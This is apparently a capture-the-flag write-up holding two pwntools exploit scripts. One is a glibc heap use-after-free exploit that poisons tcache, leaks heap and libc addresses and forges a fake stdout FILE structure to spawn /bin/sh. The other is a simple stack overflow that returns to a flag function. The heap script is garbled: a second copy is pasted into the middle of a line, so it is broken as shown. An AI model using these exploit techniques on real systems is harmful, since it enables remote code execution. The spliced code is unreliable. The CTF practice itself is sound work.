*Guide to Heap*

Classic heap challenge (UAF)
```python
#!/usr/bin/env python3

from pwn import *
libc = ELF("./libc.so.6")

elf = ELF("./chall_patched")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '160']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	 return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("chal1.fwectf.com", 8010)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
r.timeout = 1

rcu(b">")
def menu(choice): sl(bc(choice))
def alloc(idx, size, data):
    menu(1)
    sla(b"Index: ", bc(idx))
    sla(b"Size: ", bc(size))
    sa(b"Data: ", data)
    rcu(b">")
def delete(idx):
    menu(2)
    sla(b"Index: ", bc(idx))
    rcu(b">")
def edit(idx, data):
    menu(3)
    sla(b"Index: ", bc(idx))
    sa(b"Data: ", data)
    rcu(b">")
def show(idx):
    menu(4)
    sla(b"Index: ", bc(idx))
    return r.recvn(0x100)


alloc(0, 0xf8, b"A"*0x88)
alloc(1, 0xf8, b"X"*0x88)
delete(0)                 # puntero queda vivo en chunks[0] -> UAF
leak = u64(show(0)[:6].ljust(8,b"\x00"))            # lee 0x100 bytes del chunk liberado (incluye puntero en tcache, safe-linking)
logleak("heap mangled leak", leak)
heap_base = demangle_base(leak)
logleak("heap base", heap_base)
delete(1)
#reset
alloc(2, 0x418, b"B"*8)
alloc(3, 0x18,b"guard")


delete(2)
leak = u64(show(2)[:6].ljust(8,b"\x00")) 
logleak("libc leak", leak)
libc.address = leak - 0x203b20
libcbase()


gadget = libc.address +  0x00000000001724f0# add rdi, 0x10; jmp rcx;
stdout_lock = libc.address + 0x205710	# _IO_stdfile_1_lock
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

log.info(f"gadget (add rdi, 0x10; jmp rcx;) = {hex(gadget)}")
log.info(f"_IO_2_1_stdout_ = {hex(libc.sym._IO_2_1_stdout_)}")
log.info(f"lock = {hex(stdout_lock)}")
#Fake stdout using the _IO_wfile_underflow technique 

fake = FileStructure#!/usr/bin/env python3

from pwn import *
libc = ELF("./libc.so.6")

elf = ELF("./chall_patched")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '160']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	 return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("chal1.fwectf.com", 8010)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
r.timeout = 1

rcu(b">")
def menu(choice): sl(bc(choice))
def alloc(idx, size, data):
    menu(1)
    sla(b"Index: ", bc(idx))
    sla(b"Size: ", bc(size))
    sa(b"Data: ", data)
    rcu(b">")
def delete(idx):
    menu(2)
    sla(b"Index: ", bc(idx))
    rcu(b">")
def edit(idx, data):
    menu(3)
    sla(b"Index: ", bc(idx))
    sa(b"Data: ", data)
    rcu(b">")
def show(idx):
    menu(4)
    sla(b"Index: ", bc(idx))
    return r.recvn(0x100)


alloc(0, 0xf8, b"A"*0x88)
alloc(1, 0xf8, b"X"*0x88)
delete(0)                 # puntero queda vivo en chunks[0] -> UAF
leak = u64(show(0)[:6].ljust(8,b"\x00"))            # lee 0x100 bytes del chunk liberado (incluye puntero en tcache, safe-linking)
logleak("heap mangled leak", leak)
heap_base = demangle_base(leak)
logleak("heap base", heap_base)
delete(1)
#reset
alloc(2, 0x418, b"B"*8)
alloc(3, 0x18,b"guard")


delete(2)
leak = u64(show(2)[:6].ljust(8,b"\x00")) 
logleak("libc leak", leak)
libc.address = leak - 0x203b20
libcbase()


gadget = libc.address +  0x00000000001724f0# add rdi, 0x10; jmp rcx;
stdout_lock = libc.address + 0x205710	# _IO_stdfile_1_lock
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

log.info(f"gadget (add rdi, 0x10; jmp rcx;) = {hex(gadget)}")
log.info(f"_IO_2_1_stdout_ = {hex(libc.sym._IO_2_1_stdout_)}")
log.info(f"lock = {hex(stdout_lock)}")
#Fake stdout using the _IO_wfile_underflow technique 

fake = FileStructure(0)
fake.flags = 0x0
fake._IO_read_end=libc.sym.system#  system()
fake._IO_save_base = p64(gadget)
fake._IO_write_end=u64(b'/bin/sh\x00')# rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200	# _wide_data => 0x0
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
log.info(f"len of fake stdout {hex(len(fake))}")

#UAF to alloc in _IO_2_1_stdout_
edit(1, p64(remangle(heap_base, libc.sym._IO_2_1_stdout_)))

alloc(1, 0xf8,p64(0xcafebabe))

sleep
alloc(4, 0xf8, bytes(fake))


#========= interactive ====================
r.interactive()
#fwectf{kn0w1ng_7c4ch3(0)
fake.flags = 0x0
fake._IO_read_end=libc.sym.system#  system()
fake._IO_save_base = p64(gadget)
fake._IO_write_end=u64(b'/bin/sh\x00')# rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200	# _wide_data => 0x0
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
log.info(f"len of fake stdout {hex(len(fake))}")

#UAF to alloc in _IO_2_1_stdout_
edit(1, p64(remangle(heap_base, libc.sym._IO_2_1_stdout_)))

alloc(1, 0xf8,p64(0xcafebabe))

sleep
alloc(4, 0xf8, bytes(fake))


#========= interactive ====================
r.interactive()
#fwectf{kn0w1ng_7c4ch3
```
*pwnme*
Easy pwn challenge
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./main_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '160']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	 return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("chal2.fwectf.com", 8000)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

rop = ROP(elf)
payload = b"A"*0x10
payload += b"B"*8
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.flag)

sla(b"do nothing else:", payload)

#========= interactive ====================
r.interactive()
#fwectf{bof_b0f_6of_60f}
```